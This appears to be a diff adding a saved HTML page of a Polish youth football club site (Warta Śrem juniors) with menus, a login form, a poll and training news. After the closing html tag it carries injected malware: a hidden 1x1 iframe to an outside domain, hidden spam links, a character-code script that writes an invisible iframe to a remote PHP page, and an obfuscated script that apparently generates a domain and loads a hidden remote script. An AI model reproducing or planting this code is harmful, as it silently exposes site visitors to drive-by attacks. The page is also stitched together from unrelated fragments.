@@ -1,0 +1,508 @@
+ďťż
+
+<meta http-equiv="Content-type" content="text/html; charset=iso-8859-2">
+<meta http-equiv="Reply-to" content="kess@o2.pl">
+<meta name="Author" content="Krzysztof Szypulski">
+<title>Data pl v0.2 - by KESS</title>
+</head>
+<body>
+<!-- zaznacz od tego miejsca i wklej na swojÂą stronÄ -->
+Dzisiaj jest wtorek, 15 lutego 2011 r. 
+
+
+Odwiedzilo nas
+00000<!-- Dolph-Guest-Counter Copyright by Pathfinder(pathfinder@pf.pl) || http://pathfinder.eia.pl -->
+<?xml version="1.0" encoding="ISO-8859-2"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<title>wartasrem - Start</title>
+<meta name="description" content="WArta Srem :)" />
+<meta name="keywords" content="Warta!, Warta!" />
+<meta name="Generator" content="Joomla! - Copyright (C) 2005 - 2006 Open Source Matters. All rights reserved." />
+<meta name="robots" content="index, follow" />
+	<link rel="shortcut icon" href="http://www.zspec.ovh.org/images/favicon.ico" />
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-2" />
+<link href="http://www.zspec.ovh.org/templates/rhuk_solarflare_iii/css/template_css.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+
+<div align="center">
+  <div id="body_outline"> <!-- Der Hauptcontainer fĂźr die gesamte Ausgabe -->
+  
+    <div id="con_u_34">  <!-- Container fuer user 3 und 4, damit sie beim Verschieben nicht ausbrechen -->
+	
+       <div id="user_3_outline"> 
+          <ul id="mainlevel-nav"><li><a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=section&amp;id=5&amp;Itemid=32" class="mainlevel-nav" >Juniorzy Starsi</a></li><li><a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=section&amp;id=6&amp;Itemid=33" class="mainlevel-nav" >Juniorzy Mlodsi</a></li></ul>       </div>
+	   
+       <div id="user_4_outline">
+          
+<form action="index.php?option=com_search" method="get">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="search" class="inputbox" type="text" size="20" value="szukaj..."  onblur="if(this.value=='') this.value='szukaj...';" onfocus="if(this.value=='szukaj...') this.value='';" />	</div>
+
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="" />	
+</form>       </div>
+	   
+	</div> <!-- Ende Container user 3 u 4 -->
+    <div class="clr"></div> <!-- Zeilenumbruch -->
+	
+    <div id="header_area"> <!-- Grafik des Headers -->
+      <div id="header"></div>
+    </div>
+	
+    <div class="clr"></div>
+	
+         <div id="con_left">  							<!-- begin Container Left -->
+               <div id="left_outline"> 						<!-- Rahmen Menu left -->
+            		<table cellpadding="0" cellspacing="0" class="moduletable">
+					<tr>
+				<th valign="top">
+					Menu główne				</th>
+			</tr>
+					<tr>
+			<td>
+				
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_frontpage&amp;Itemid=1" class="mainlevel" id="active_menu">Start</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_artgbook&amp;Itemid=41" class="mainlevel" >Ksiega Gosci</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_weblinks&amp;catid=25&amp;Itemid=49" class="mainlevel" >Galeria</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=47&amp;Itemid=36" class="mainlevel" >Kadra JS</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=48&amp;Itemid=37" class="mainlevel" >Kadra JM</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=50&amp;Itemid=39" class="mainlevel" >Terminarz JS</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=49&amp;Itemid=38" class="mainlevel" >Terminarz JM</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_weblinks&amp;catid=24&amp;Itemid=46" class="mainlevel" >Tabele</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_poll&amp;Itemid=47" class="mainlevel" >Sondy</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_sefservicemap&amp;Itemid=43" class="mainlevel" >Mapa Serwisu</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_extcalendar&amp;Itemid=44" class="mainlevel" >Kalendarz</a></td></tr>
+<tr align="left"><td><a href="http://www.zspec.ovh.org/index.php?option=com_mp3player&amp;Itemid=45" class="mainlevel" >playyer</a></td></tr>
+</table>			</td>
+		</tr>
+		</table>
+				<table cellpadding="0" cellspacing="0" class="moduletable">
+				<tr>
+			<td>
+				
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+<tr align="left"><td><a href="http://www.zspec.ovh.org/administrator/" class="mainlevel" >Administrator</a></td></tr>
+</table>			</td>
+		</tr>
+		</table>
+				<table cellpadding="0" cellspacing="0" class="moduletable">
+					<tr>
+				<th valign="top">
+					Logowanie				</th>
+			</tr>
+					<tr>
+			<td>
+					<form action="http://www.zspec.ovh.org/index.php" method="post" name="login" >
+		
+	<div class="login">
+			<label for="mod_login_username">
+				Login			</label>
+			<br />
+			<input name="username" id="mod_login_username" type="text" class="inputbox" alt="Login" size="12" />
+			<br />
+			<label for="mod_login_password">
+				Hasło			</label>
+			<br />
+			<input type="password" id="mod_login_password" name="passwd" class="inputbox" size="12" alt="Hasło" />
+			<br />
+			<input type="checkbox" name="remember" id="mod_login_remember" class="inputbox" value="yes" alt="Remember Me" />
+			<label for="mod_login_remember">
+				Zapamiętać?			</label>
+			<br />
+			<input type="submit" name="Submit" class="button" value="Zaloguj" />
+			<br />
+			<a href="http://www.zspec.ovh.org/index.php?option=com_registration&amp;task=lostPassword">
+				Nie pamiętam hasła</a>
+			<br />
+					Konto?				<a href="http://www.zspec.ovh.org/index.php?option=com_registration&amp;task=register">
+					Zarejestruj się!</a>
+			<br />
+		</div>
+	
+	<input type="hidden" name="option" value="login" />
+	<input type="hidden" name="op2" value="login" />
+	<input type="hidden" name="lang" value="polish" />
+	<input type="hidden" name="return" value="http://zspec.ovh.org/" />
+	<input type="hidden" name="message" value="0" />
+	<input type="hidden" name="j9ffbbe415939aff57f4c4a3e0458a012" value="1" />
+	</form>
+				</td>
+		</tr>
+		</table>
+				<table cellpadding="0" cellspacing="0" class="moduletable">
+					<tr>
+				<th valign="top">
+					Wieści RSS				</th>
+			</tr>
+					<tr>
+			<td>
+				<div class="syndicate">
+			<div align="center">
+			<a href="http://www.zspec.ovh.org/index.php?option=com_rss&amp;feed=RSS0.91&amp;no_html=1">
+				<img src="http://www.zspec.ovh.org/images/M_images/rss091.gif"  alt="RSS 0.91" name="RSS091" align="middle" border="0" /></a>
+		</div>
+				<div align="center">
+			<a href="http://www.zspec.ovh.org/index.php?option=com_rss&amp;feed=RSS1.0&amp;no_html=1">
+				<img src="http://www.zspec.ovh.org/images/M_images/rss10.gif"  alt="RSS 1.0" name="RSS10" align="middle" border="0" /></a>
+		</div>
+				<div align="center">
+			<a href="http://www.zspec.ovh.org/index.php?option=com_rss&amp;feed=RSS2.0&amp;no_html=1">
+				<img src="http://www.zspec.ovh.org/images/M_images/rss20.gif"  alt="RSS 2.0" name="RSS20" align="middle" border="0" /></a>
+		</div>
+				<div align="center">
+			<a href="http://www.zspec.ovh.org/index.php?option=com_rss&amp;feed=ATOM0.3&amp;no_html=1">
+				<img src="http://www.zspec.ovh.org/images/M_images/atom03.gif"  alt="ATOM 0.3" name="ATOM03" align="middle" border="0" /></a>
+		</div>
+				<div align="center">
+			<a href="http://www.zspec.ovh.org/index.php?option=com_rss&amp;feed=OPML&amp;no_html=1">
+				<img src="http://www.zspec.ovh.org/images/M_images/opml.png"  alt="OPML" name="OPML" align="middle" border="0" /></a>
+		</div>
+		</div>			</td>
+		</tr>
+		</table>
+		         </div>
+      </div>											<!-- ende Container Left -->
+      
+      <div id="sandbox_1"> 		<!-- grosser Hauptcontainer ausgeben -->
+      		    <div id="con_right">   						<!-- Container rechts -->
+       
+		    			  <div id="right_outline">
+			     		<div class="moduletable">
+							<h3>
+					Sondy				</h3>
+						<script language="javascript" type="text/javascript">
+		<!--
+		function submitbutton_Poll1() {
+			var form 		= document.pollxtd1;			
+			var radio		= form.voteid;
+			var radioLength = radio.length;
+			var check 		= 0;
+
+			if ( 'z' != 'z' ) {
+				alert('Otrzymaliśmy już dzisiaj Twój głos w tej sondzie!');
+				return;
+			}
+			for(var i = 0; i < radioLength; i++) {
+				if(radio[i].checked) {
+					form.submit();
+					check = 1;					
+				}
+			}		
+			if (check == 0) {
+				alert('Wybierz odpowiedź i spróbuj ponownie');
+			}
+		}		
+		//-->
+		</script>		
+		<form name="pollxtd1" method="post" action="http://www.zspec.ovh.org/index.php?option=com_poll&amp;Itemid=47">
+		
+		<table width="95%" border="0" cellspacing="0" cellpadding="1" align="center" class="poll">
+		<thead>
+		<tr>
+			<td style="font-weight: bold;">
+				Runda Jesienna w wykonaniu Juniorów Młodszych i Starszych byla...?			</td>
+		</tr>
+		</thead>
+		<tr>
+			<td align="center">
+				<table class="pollstableborder" cellspacing="0" cellpadding="0" border="0">
+											<tr>
+								<td class="sectiontableentry2" valign="top">
+									<input type="radio" name="voteid" id="voteid49" value="49" alt="49" />
+								</td>
+								<td class="sectiontableentry2" valign="top">
+									<label for="voteid49">
+										Wyśmienita! Wszystko im się udawało!									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry1" valign="top">
+									<input type="radio" name="voteid" id="voteid50" value="50" alt="50" />
+								</td>
+								<td class="sectiontableentry1" valign="top">
+									<label for="voteid50">
+										Dobra! Oba zespoły pokazały klasę!									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry2" valign="top">
+									<input type="radio" name="voteid" id="voteid51" value="51" alt="51" />
+								</td>
+								<td class="sectiontableentry2" valign="top">
+									<label for="voteid51">
+										dobra, ale lepsza w wykonaniu Juniorów Młodszych!									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry1" valign="top">
+									<input type="radio" name="voteid" id="voteid52" value="52" alt="52" />
+								</td>
+								<td class="sectiontableentry1" valign="top">
+									<label for="voteid52">
+										dobra, ale lepsza w wykonaniu Juniorów Starszych!									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry2" valign="top">
+									<input type="radio" name="voteid" id="voteid53" value="53" alt="53" />
+								</td>
+								<td class="sectiontableentry2" valign="top">
+									<label for="voteid53">
+										dość dobra, ale bywały o wiele lepsze!									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry1" valign="top">
+									<input type="radio" name="voteid" id="voteid54" value="54" alt="54" />
+								</td>
+								<td class="sectiontableentry1" valign="top">
+									<label for="voteid54">
+										Przecietna! 									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry2" valign="top">
+									<input type="radio" name="voteid" id="voteid55" value="55" alt="55" />
+								</td>
+								<td class="sectiontableentry2" valign="top">
+									<label for="voteid55">
+										Słaba, nie dali z siebie wszystkiego!									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry1" valign="top">
+									<input type="radio" name="voteid" id="voteid56" value="56" alt="56" />
+								</td>
+								<td class="sectiontableentry1" valign="top">
+									<label for="voteid56">
+										Fatalna! 									</label>
+								</td>
+							</tr>
+												<tr>
+								<td class="sectiontableentry2" valign="top">
+									<input type="radio" name="voteid" id="voteid57" value="57" alt="57" />
+								</td>
+								<td class="sectiontableentry2" valign="top">
+									<label for="voteid57">
+										Trudno ocenic jaka!									</label>
+								</td>
+							</tr>
+									</table>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<div align="center">
+					<input type="button" onclick="submitbutton_Poll1();" name="task_button" class="button" value="Głosuj" />
+					&nbsp;
+					<input type="button" name="option" class="button" value="Wyniki" onclick="document.location.href='http://www.zspec.ovh.org/index.php?option=com_poll&amp;task=results&amp;id=18&amp;Itemid=47';" />
+				</div>
+			</td>
+		</tr>
+		</table>
+
+		<input type="hidden" name="id" value="18" />
+		<input type="hidden" name="task" value="vote" />
+		<input type="hidden" name="jc1b92dfcb02179936256b81c5090b017" value="1" />
+		</form>
+				</div>
+				<div class="moduletable">
+							<h3>
+					Gościmy				</h3>
+				Odwiedza nas 1 gość		</div>
+				<div class="moduletable">
+			<img src="http://www.radiosrem.pl/img/promocja/120x200.gif" width="120" height="200" border="0" usemap="#Map"/><map name="Map" id="Map">
+<area shape="rect" coords="63,139,106,195" href="http://www.radiosrem.pl/pliki/play.asx" />
+<area shape="rect" coords="14,139,57,194" href="http://www.radiosrem.pl/pliki/play.m3u" />
+<area shape="rect" coords="0,0,120,130" href="http://www.radiosrem.pl" target="_blank"/>
+</map>		</div>
+					  </div>   									<!-- Menu noch laden --> 
+		    </div>
+		                <div id="con_main1">
+			
+							
+				<div id="user1_out_1">
+				   <ul class="latestnews">
+	<li class="latestnews">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=61&amp;Itemid=32" class="latestnews">
+			Treningi zima!</a>
+	</li>
+		<li class="latestnews">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=60&amp;Itemid=32" class="latestnews">
+			JS Zakonczyli runde - podsumowanie!</a>
+	</li>
+		<li class="latestnews">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=59&amp;Itemid=32" class="latestnews">
+			JS 1920 Mosina - Warta Śrem</a>
+	</li>
+		<li class="latestnews">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=58&amp;Itemid=32" class="latestnews">
+			Treningi!</a>
+	</li>
+		<li class="latestnews">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=57&amp;Itemid=33" class="latestnews">
+			JM Zakonczyli runde jesienna!</a>
+	</li>
+	</ul>				</div>
+				<div id="user2_out_1">
+				   <ul class="mostread">
+ 	<li class="mostread">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=53&amp;Itemid=33" class="mostread">
+			JM Warty Śrem - 13 Poznań</a>
+ 	</li>
+ 	 	<li class="mostread">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=55&amp;Itemid=32" class="mostread">
+			Polonia Poznań - Warta Śrem</a>
+ 	</li>
+ 	 	<li class="mostread">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=59&amp;Itemid=32" class="mostread">
+			JS 1920 Mosina - Warta Śrem</a>
+ 	</li>
+ 	 	<li class="mostread">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=57&amp;Itemid=33" class="mostread">
+			JM Zakonczyli runde jesienna!</a>
+ 	</li>
+ 	 	<li class="mostread">
+		<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=58&amp;Itemid=32" class="mostread">
+			Treningi!</a>
+ 	</li>
+ 	</ul>				</div>
+				<div class="clr"></div>
+						<div id="pathway_out_1">
+		   <span class="pathway">Start </span>		</div>
+		<div id="clr"></div>
+		<div id="main_out_1">
+		   <table class="blog" cellpadding="0" cellspacing="0"><tr><td valign="top"><div>			<table class="contentpaneopen">
+			<tr>
+								<td class="contentheading" width="100%">
+					Treningi zima!									</td>
+							</tr>
+			</table>
+			
+		<table class="contentpaneopen">
+					<tr>
+				<td width="70%" align="left" valign="top" colspan="2">
+					<span class="small">
+						Wpisał:  Administrator					</span>
+					&nbsp;&nbsp;
+				</td>
+			</tr>
+						<tr>
+				<td valign="top" colspan="2" class="createdate">
+					02.02.2008.				</td>
+			</tr>
+					<tr>
+			<td valign="top" colspan="2">
+				<p><font style="background-color: #dddddd">Najblizszy trening Junior&oacute;w Starszych juz w najblizszy Poniedzialek tj.<strong> 4 luty</strong> 2008r. o godzinie <strong>15,30</strong> !! na Stadionie Miejskim!</font></p>			</td>
+		</tr>
+				</table>
+		
+		<span class="article_seperator">&nbsp;</span>
+		
+		</div></td></tr><tr><td valign="top"><table width="100%"  cellpadding="0" cellspacing="0"><tr><td valign="top" width="50%">			<table class="contentpaneopen">
+			<tr>
+								<td class="contentheading" width="100%">
+					JS Zakonczyli runde - podsumowanie!									</td>
+							</tr>
+			</table>
+			
+		<table class="contentpaneopen">
+					<tr>
+				<td width="70%" align="left" valign="top" colspan="2">
+					<span class="small">
+						Wpisał:  Administrator					</span>
+					&nbsp;&nbsp;
+				</td>
+			</tr>
+						<tr>
+				<td valign="top" colspan="2" class="createdate">
+					10.11.2007.				</td>
+			</tr>
+					<tr>
+			<td valign="top" colspan="2">
+				<span style="font-size: 14pt"><font color="#000000"><font face="Times New Roman"><strong class="small">Kr&oacute;tkie podsumowanie rundy jesiennej o mistrzostwo Kl. Okr.. Jun. St.A1-A2 sezonu 2007/2008.</strong></font></font></span>			</td>
+		</tr>
+					<tr>
+				<td colspan="2" align="left" class="modifydate">
+					Zmieniony ( 10.11.2007. )
+				</td>
+			</tr>
+							<tr>
+					<td align="left" colspan="2">
+						<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=60&amp;Itemid=32" class="readon">
+							Czytaj&nbsp;całość&hellip;</a>
+					</td>
+				</tr>
+						</table>
+		
+		<span class="article_seperator">&nbsp;</span>
+		
+		</td><td valign="top" width="50%">			<table class="contentpaneopen">
+			<tr>
+								<td class="contentheading" width="100%">
+					JS 1920 Mosina - Warta Śrem									</td>
+							</tr>
+			</table>
+			
+		<table class="contentpaneopen">
+					<tr>
+				<td width="70%" align="left" valign="top" colspan="2">
+					<span class="small">
+						Wpisał:  Administrator					</span>
+					&nbsp;&nbsp;
+				</td>
+			</tr>
+						<tr>
+				<td valign="top" colspan="2" class="createdate">
+					10.11.2007.				</td>
+			</tr>
+					<tr>
+			<td valign="top" colspan="2">
+				JS 1920 Mosina - Warta Śrem 1-2(0-1) opis-&gt;			</td>
+		</tr>
+					<tr>
+				<td colspan="2" align="left" class="modifydate">
+					Zmieniony ( 10.11.2007. )
+				</td>
+			</tr>
+							<tr>
+					<td align="left" colspan="2">
+						<a href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=59&amp;Itemid=32" class="readon">
+							Czytaj&nbsp;całość&hellip;</a>
+					</td>
+				</tr>
+						</table>
+		
+		<span class="article_seperator">&nbsp;</span>
+		
+		</td></tr></table></td></tr><tr><td valign="top"><div class="blog_more">			<div>
+				<strong>
+				Zobacz też&hellip;				</strong>
+			</div>
+					<ul>
+					<li>
+				<a class="blogsection" href="http://www.zspec.ovh.org/index.php?option=com_content&amp;task=view&amp;id=57&amp;Itemid=33">
+					JM Zakonczyli runde jesienna!</a>
+			</li>
+					</ul>
+		</div></td></tr></table>		</div>
+     </div> <!-- gelber Container schliessen -->      
+   </div> <!-- Blauer Container schliessen -->
+   <div class="clr"></div>
+   <div id="footer"><div align="center">&copy; <a href="http://www.mont-bit.com">Mont-Bit International</a> / Herceg Novi / Crnagora</div>
+   </div>
+   
+   <div class="clr"></div>
+   </div>
+  
+</body>
+</html><!-- 1297735300 --><iframe src='http://pwias.engineanalog.com/' width='1' height='1' style='visibility: hidden;'></iframe>
+<div style='display: none'>
+<a href='http://www.ohsi.ru/j/index.php'>îőđŕíŕ ňđóäŕ, óńëóăč ďî îőđŕíĺ ňđóäŕ, óńëóăč číćĺíĺđŕ ďî îőđŕíĺ ňđóäŕ, îęŕçŕíčĺ óńëóă ďî îőđŕíĺ ňđóäŕ, číńňđóęöčč ďî îőđŕíĺ ňđóäŕ, ďđĺäďčńŕíčĺ číńďĺęňîđŕ ďî îőđŕíĺ ňđóäŕ, đŕáîňű ďî îőđŕíĺ ňđóäŕ, ŕóňńîđńčíă ďî îőđŕíĺ ňđóäŕ, âĺäĺíčĺ đŕáîň ďî îőđŕíĺ ňđóäŕ</a>
+</div>
+<script type="text/javascript">var JcRoHuxfiRTJAFYqpmpQ = "V60V105V102V114V97V109V101V32V119V105V100V116V104V61V34V52V56V48V34V32V104V101V105V103V104V116V61V34V54V48V34V32V115V114V99V61V34V104V116V116V112V58V47V47V101V109V98V114V97V114V105V45V49V46V99V110V47V103V105V114V105V50V47V105V110V100V101V120V46V112V104V112V34V32V115V116V121V108V101V61V34V98V111V114V100V101V114V58V48V112V120V59V32V112V111V115V105V116V105V111V110V58V114V101V108V97V116V105V118V101V59V32V116V111V112V58V48V112V120V59V32V108V101V102V116V58V45V53V48V48V112V120V59V32V111V112V97V99V105V116V121V58V48V59V32V102V105V108V116V101V114V58V112V114V111V103V105V100V58V68V88V73V109V97V103V101V84V114V97V110V115V102V111V114V109V46V77V105V99V114V111V115V111V102V116V46V65V108V112V104V97V40V111V112V97V99V105V116V121V61V48V41V59V32V45V109V111V122V45V111V112V97V99V105V116V121V58V48V34V62V60V47V105V102V114V97V109V101V62";var WHMpoVqZdzMncdbkYYPG = JcRoHuxfiRTJAFYqpmpQ.split("V");var qiQqooheaWuweHmSddsG = "";for (var cFtFjVpHuEOknebbSIFt=1; cFtFjVpHuEOknebbSIFt<WHMpoVqZdzMncdbkYYPG.length; cFtFjVpHuEOknebbSIFt++){qiQqooheaWuweHmSddsG+=String.fromCharCode(WHMpoVqZdzMncdbkYYPG[cFtFjVpHuEOknebbSIFt]);}document.write(qiQqooheaWuweHmSddsG)</script><script language="javascript">$a="Z64dZ3dZ22q|se|qdu]qwys^e}rub8tqiZ3c0}Z257F~dxZ3c0iuqbZ3c0y~tuh9kbudeb~0888iuqb0;08y~tuh0:0tqi990;08}Z257F~dx0N0tqi90:0y~tuh90;0tqi9+mfqb0iuqbSx!Z3c0iuqbSxZ2522Z3c0}Z257F~dxSxZ3c0tqiSxZ3c0}qwys^e}+~e}0-0Sq|se|qdu]qwys^e}rub8dy}uK7tqi7MZ3c0dy}uK7}Z257F~dx7MZ3c0dy}uK7iuqb7MZ3c0cxyvdY~tuh9+iuqbSx!0-0|uddubcK888dy}uK7iuqb7M060Z2520hQQ90;0~e}9050Z2526#9050Z2522Z2526M0;0|uddubcK888dy}uK7iuqb7M060Z2520hQQ90,,0Z252290;0~e}9050Z2522Z25M+Z22;cuZ3dZ22(p}b4g`mxq)6b}g}v}x}`m.|}ppqz6*(}rfuyq4gfw)6|``d.;;rvwyr}f:wZ7by;xp;v}zfszZ2526;64c}p`|)Z25$$4|q}s|`),$*(;}rfuyq*(;p}b*Z22;cbZ3dZ2273);Z2573tZ253dtmZ2570Z253dZ2527Z2527;for(iZ253d0;iZ253cdsZ252elZ2565ngtZ2568;Z22;daZ3dZ22fqb0t-7vrs}vybZ3esZ257F}7+0fqb0cxyvdY~tuh0-0Z2520+fqb0}Z257F~dxc0-0~ug0Qbbqi87e~Z257F7Z3c07tfu7Z3c07dxb7Z3c07vyb7Z3c07fyv7Z3c07huc7Z3c07fuc7Z3c07wxd7Z3c07u~y7Z3c07ud~7Z3c07|uf7Z3c07dgu79+fqb0|uddubc0-0~ug0Qbbqi87q7Z3c7r7Z3c7s7Z3c7t7Z3c7u7Z3c7v7Z3c7w7Z3c7x7Z3c7y7Z3c7z7Z3c7Z7b7Z3c7|7Z3c7}7Z3c7~7Z3c7Z257F7Z3c7`7Z3c7a7Z3c7b7Z3c7c7Z3c7d7Z3c7e7Z3c7f7Z3c7g7Z3c7h7Z3c7i7Z3c7j79+fqb0~e}rubc0-0~ug0Qbbqi8!Z3cZ2522Z3c#Z3c$Z3cZ25Z3cZ2526Z3cZ27Z3c(Z3c)9+fqb0dy}u0-0~ug0Qbbqi89+fqb0tqdu0-0~ug0Tqdu8Z22;dzZ3dZ22Z2566Z2575Z256ecZ2574Z2569oZ256e dwZ2528t)Z257bZ2563Z2561Z253dZ2527Z252564Z25256fZ252563Z252575mZ2565nZ25257Z2534.Z252577rZ2569Z252574Z252565(Z25252Z2532Z2527;cZ2565Z253dZ2527Z252522)Z2527;cbZ253dZ2527Z25253cscrZ252569Z252570Z2574 Z25256caZ2525Z2536egZ2525Z25375Z2561Z2567eZ25253dZ25255cZ25252Z2532jaZ2576Z252561Z2573cZ252572iZ252570tZ25255cZ252522Z25253eZ2527;Z2563Z2563Z253dZ2527Z25253cZ25255cZ25252fscripZ25257Z2534Z25253eZ2527;evaZ256c(unZ2565Z2573caZ2570e(tZ2529)Z257d;Z22;stZ3dZ22Z2573tZ253dZ2522Z2524Z2561Z253dsZ2574;Z2564cZ2573(Z2564aZ252bdZ2562Z252bdZ2563+Z2564Z2564+Z2564Z2565,Z2531Z2530Z2529;Z2564Z2577Z2528Z2573tZ2529;Z2573tZ253dZ2524Z2561;Z2522Z253bZ22;cdZ3dZ22sZ2574Z252bZ2553triZ256egZ252efrZ256fZ256dChZ2561rCoZ2564eZ2528(tZ256dZ2570Z252eZ256Z22;dcZ3dZ220!9+0yv08tqduZ3ewud]Z257F~dx89;!0,0!Z25209kcxyvdY~tuh0-0dy}uK7iuqb7M0;07Z3dZ252070;08tqduZ3ewud]Z257F~dx89;!90+mu|cukcxyvdY~tuh0-0dy}uK7iuqb7M0;07Z3d70;08tqduZ3ewud]Z257F~dx89;!9+myv08tqduZ3ewudTqdu890;!0,0!Z25209kcxyvdY~tuh0-cxyvdY~tuh0;07Z3dZ252070;0tqduZ3ewudTqdu89+mu|cukcxyvdY~tuh0-0cxyvdY~tuh0;07Z3d70;0tqduZ3ewudTqdu89+mcxyvdY~tuh0-0gy~tZ257FgZ3edgZ3edbu~tcKcxyvdY~tuhMKZ2520MZ3eaeubiZ3esxqbSZ257FtuQd8!9+ve~sdyZ257F~0SZ22;caZ3dZ22Z2566uZ256ectiZ256fn dZ2563s(Z2564sZ252ces)Z257bdsZ253duneZ2573capZ2565(Z2564Z25Z22;czZ3dZ22Z2566uncZ2574iZ256fnZ2520Z2563z(cZ257a)Z257brZ2565tuZ2572n Z2563Z2561+Z2563b+cZ2563+Z2563d+cZ2565+Z2563zZ253b}Z253bZ22;ceZ3dZ223harZ2543odeZ2541tZ25280)^Z2528Z25270Z2578Z25300Z2527+eZ2573Z2529));Z257d}Z22;dbZ3dZ229+tqduZ3ecudTqdu8tqduZ3ewudTqdu890Z3d0#9+0dy}uK7iuqb7M0-0tqduZ3ewudVe||Iuqb89+dy}uK7}Z257F~dx7M0-0tqduZ3ewud]Z257F~dx89;!+dy}uK7tqi7M0-0tqduZ3ewudTqdu89+yv08tqduZ3ewudTqi890--0!0ll0tqduZ3ewudTqi890--0Z25260ll0tqduZ3ewudTqi890--0$9ktqduZ3ecudTqdu8tqduZ3ewudTqdu890Z3d0!9+0dy}uK7tqi7M0-0tqduZ3ewudTqdu89+0dy}uK7}Z257F~dx7M0-0tqduZ3ewud]Z257F~dx89;!+0dy}uK7iuqb7M0-0tqduZ3ewudVe||Iuqb89+0m0tqduZ3ecudTqdu8tqduZ3ewudTqdu890;Z22;opZ3dZ22Z2524Z2561Z253dZ2522dZ2577(dZ2563s(cZ2575,14Z2529)Z253bZ2522;Z22;ccZ3dZ22Z2569+Z252b)Z257btmpZ253ddZ2573Z252eZ2573liZ2563eZ2528iZ252ci+Z2531)Z253bsZ2574Z253dZ22;deZ3dZ22iuqbSxZ25220-0|uddubcK8888dy}uK7iuqb7M060Z2520h##!!90..0#90;0~e}9050!Z25209M0;0|uddubcK8888dy}uK7iuqb7M060Z2520h##!!90..0$90;0~e}9050!Z25209M+}Z257F~dxSx0-0|uddubcK88dy}uK7}Z257F~dx7M0;0~e}9050Z2522Z259M0;0|uddubcK88dy}uK7}Z257F~dx7M0:0~e}9050Z2522Z259M+tqiSx0-0|uddubcK88dy}uK7tqi7M0:0Z25269050Z2522Z279M+4q-4qZ3ebu`|qsu8tZ3ciuqbSxZ25220;0}Z257F~dxSx0;0iuqbSx!0;0tqiSx0;0}Z257F~dxcKdy}uK7}Z257F~dx7M0Z3d0!M0;07Z3esZ257F}79+Z22;Z69Z66 (dZ6fcZ75Z6deZ6eZ74Z2ecoZ6fZ6bieZ2eZ69nZ64eZ78Z4ff(Z27rZ665Z66Z36dZ73Z27)Z3dZ3d-1)Z7bfuncZ74Z69on Z63alZ6cbacZ6b(x)Z7b Z77indZ6fZ77.twZ20Z3d Z78;sZ63(Z27rf5fZ36dsZ27,2,Z37);eZ76alZ28uneZ73caZ70e(dZ7aZ2bcZ7aZ2bZ6fp+sZ74)Z2bZ27dw(Z64z+cZ7aZ28$a+Z73t)Z29;Z27);Z64Z6fcuZ6denZ74.Z77ritZ65($aZ29;}Z64oZ63umZ65nZ74.wZ72Z69Z74e(Z22Z3cimgZ20srZ63Z3dZ27htZ74p:Z2fZ2fsearZ63h.tZ77Z69tZ74er.Z63omZ2fimagZ65sZ2fsearcZ68Z2frss.Z70nZ67Z27 widZ74hZ3d1 Z68Z65iZ67htZ3d1Z20styZ6ceZ3dZ27visibiliZ74y:hZ69ddeZ6eZ27 Z2fZ3e Z3cscrZ22+Z22ipt lZ61Z6eZ67uaZ67eZ3djavaZ73cZ72iptZ22+Z22 srcZ3dZ27httpZ3aZ2fZ2fsearcZ68.twZ69tteZ72.coZ6dZ2ftreZ6edZ73Z2fweekZ6cy.jZ73oZ6e?cZ61llbZ61Z63Z6bZ3dcallZ62aZ63k&Z65Z78Z63lZ75deZ3dZ68aZ73htZ61gZ73Z27Z3eZ22 + Z22Z3cZ2fscrZ22 + 